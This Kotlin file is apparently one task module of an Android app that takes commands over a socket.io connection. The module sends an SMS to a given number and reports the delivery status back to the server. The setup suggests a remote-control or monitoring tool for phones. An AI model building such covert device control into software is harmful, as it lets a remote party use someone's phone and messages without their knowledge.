package me.hawkshaw.tasks

import android.app.Activity
import android.app.PendingIntent
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.telephony.SmsManager
import android.util.Log
import io.socket.client.Socket
import me.hawkshaw.services.CommandService
import org.json.JSONObject


class SendSmsTask(private val ctx: CommandService, private val message: String, private val phoneNumber: String, private val socket: Socket) : BaseTask(ctx) {

    private val smsSent = "smsSent"
    private val smsDelivered = "smsDelivered"

    private fun sendSms() {

        val manager = SmsManager.getDefault()
        val piSend = PendingIntent.getBroadcast(ctx, 0, Intent(smsSent), 0)
        val piDelivered = PendingIntent.getBroadcast(ctx, 0, Intent(smsDelivered), 0)
        val length = message.length

        if (length > 160) {
            val messageList = manager.divideMessage(message)
            manager.sendMultipartTextMessage(phoneNumber, null, messageList, null, null)
        } else {
            manager.sendTextMessage(phoneNumber, null, message, piSend, piDelivered)
        }
    }

    private val receiver = object : BroadcastReceiver() {

        override fun onReceive(context: Context, intent: Intent) {
            val status: String
            val reason: String

            when (resultCode) {
                Activity.RESULT_OK -> {
                    status = "success"
                    reason = "Everything was good :-)"
                }
                SmsManager.RESULT_ERROR_GENERIC_FAILURE -> {
                    status = "failed"
                    reason = "Message not sent."
                }
                SmsManager.RESULT_ERROR_NO_SERVICE -> {
                    status = "failed"
                    reason = "No service."
                }
                SmsManager.RESULT_ERROR_NULL_PDU -> {
                    status = "failed"
                    reason = "Error: Null PDU."
                }
                SmsManager.RESULT_ERROR_RADIO_OFF -> {
                    status = "failed"
                    reason = "Error: Radio off."
                }
                else -> {
                    status = "failed"
                    reason = "unknown"
                }
            }

            Log.i(tag, status + reason)

            foo(status, reason)
            context.unregisterReceiver(this)
        }

        private fun foo(status: String, reason: String) {

            val data = JSONObject()
            data.put("status", status)
            data.put("reason", reason)
            data.put("dataType", "sendSmsStatus")

            socket.emit("usrData", data)
        }
    }

    override fun run() {
        super.run()
        ctx.registerReceiver(receiver, IntentFilter(smsSent))
        sendSms()
    }
}


